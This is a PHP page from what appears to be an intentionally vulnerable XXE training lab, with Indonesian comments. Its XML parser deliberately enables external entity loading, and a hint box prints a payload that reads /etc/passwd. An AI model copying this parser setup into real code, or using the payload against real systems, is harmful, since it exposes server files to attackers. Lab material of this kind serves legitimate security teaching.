<?php
session_start();
include '../../config/db.php';
include '../../core/auth.php';

$output = "";
$xml_input = isset($_POST['xml_data']) ? $_POST['xml_data'] : "";

if ($xml_input) {
    /**
     * REVISI: PHP 8.0+ tidak lagi menggunakan libxml_disable_entity_loader.
     * Sebagai gantinya, kita mengaktifkan fitur berbahaya lewat opsi di loadXML.
     */
    
    $dom = new DOMDocument();
    
    // LIBXML_NOENT: Memungkinkan substitusi entitas
    // LIBXML_DTDLOAD: Memungkinkan pemuatan DTD eksternal (Kunci XXE)
    // Kita gunakan error handling agar script tidak crash jika XML rusak
    libxml_use_internal_errors(true);
    
    if ($dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD)) {
        $info = simplexml_import_dom($dom);
        
        // Pastikan element user dan email ada sebelum ditampilkan
        $user = isset($info->user) ? (string)$info->user : "N/A";
        $email = isset($info->email) ? (string)$info->email : "N/A";
        
        $output = "Data berhasil diproses: User <strong>" . htmlspecialchars($user) . "</strong> dengan email <strong>" . htmlspecialchars($email) . "</strong>.";
    } else {
        $errors = libxml_get_errors();
        $error_msg = "";
        foreach ($errors as $err) {
            $error_msg .= "Line {$err->line}: {$err->message}<br>";
        }
        $error = "Format XML tidak valid!<br><small>$error_msg</small>";
        libxml_clear_errors();
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXE Lab | mrahmatt74 Security</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="../../public/assets/xxe.css">
</head>
<body>

<div class="container">
    <div class="header">
        <h2><i class="fas fa-file-code"></i> XXE Injection Lab</h2>
        <a href="../../index.php" class="btn-back"><i class="fas fa-arrow-left"></i> Dashboard</a>
    </div>

    <div class="card">
        <p>Gunakan modul ini untuk mensimulasikan import data profil pengguna melalui format XML.</p>
        
        <form method="POST">
            <div class="input-area">
                <label>Input XML Data:</label>
                <textarea name="xml_data" placeholder='<root><user>Rahmat</user><email>rahmat@adr.com</email></root>' required><?= htmlspecialchars(trim($xml_input)) ?></textarea>
            </div>
            <button type="submit">Process XML Data</button>
        </form>

        <?php if (isset($error)): ?>
            <div class="error-msg"><?= $error ?></div>
        <?php endif; ?>

        <div class="result-box">
            <div class="result-header">
                <i class="fas fa-terminal"></i> Parser Output
            </div>
            <div class="result-content">
                <?php if ($output): ?>
                    <p><?= $output ?></p>
                <?php else: ?>
                    <p style="color:#999; text-align:center;">Hasil parsing akan muncul di sini.</p>
                <?php endif; ?>
            </div>
        </div>

        <div class="payload-hint">
            <strong>Lab Objective:</strong><br>
            Gunakan payload ini untuk membaca <code>/etc/passwd</code>. <br>
            <em>Penting: Pastikan baris pertama dimulai dengan tag XML tanpa spasi!</em>
            <pre style="background: #e8f5e9; padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 0.8rem;">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;root&gt;
  &lt;user&gt;&amp;xxe;&lt;/user&gt;
  &lt;email&gt;test@adr.com&lt;/email&gt;
&lt;/root&gt;</pre>
        </div>
    </div>
</div>

</body>
</html>